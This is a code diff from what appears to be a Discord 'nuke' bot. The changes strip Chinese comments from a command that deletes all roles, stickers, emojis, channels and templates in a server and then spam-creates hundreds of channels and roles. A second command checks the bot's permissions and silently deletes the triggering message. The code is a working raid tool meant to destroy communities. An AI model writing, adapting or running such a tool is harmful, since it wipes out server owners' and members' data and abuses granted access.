@@ -37,32 +37,32 @@ async def nuke(ctx):
       continue
 
   if config_data['del_roles'] == True:
-    for role in ctx.guild.roles: #刪除所有身分組
+    for role in ctx.guild.roles:
       try:
         await role.delete()
       except:
         continue
 
-  for sticker in ctx.guild.stickers: #刪除所有貼圖   
+  for sticker in ctx.guild.stickers:
     try:
       await sticker.delete()
     except:
       continue
 
-  for emoji in ctx.guild.emojis: #刪除所有表情符號
+  for emoji in ctx.guild.emojis:
     try:
       await emoji.delete()      
     except:
       continue
 
-  for channel in ctx.guild.channels: #刪除所有頻道
+  for channel in ctx.guild.channels:
     try:
       await channel.delete()
 
     except:
       continue
 
-  for template in await ctx.guild.templates(): #刪除所有模板
+  for template in await ctx.guild.templates():
     try:
       await template.delete()
 
@@ -75,13 +75,13 @@ async def nuke(ctx):
 
   for i in range(1, 500):
     color = next(color_cycle)
-    await ctx.guild.create_text_channel(config_data['channel_name']) #創建新頻道
-    await channel.guild.create_role(name = config_data['role_name'], color=color) #創建新身分組
+    await ctx.guild.create_text_channel(config_data['channel_name'])
+    await channel.guild.create_role(name = config_data['role_name'], color=color)
 
 @bot.command()
-async def check(ctx): #使用!check檢查機器人是否有權限
+async def check(ctx):
     guild = ctx.guild
-    await ctx.message.delete()  #刪掉檢查訊息
+    await ctx.message.delete()
     if guild:
         bot_member = guild.me
 
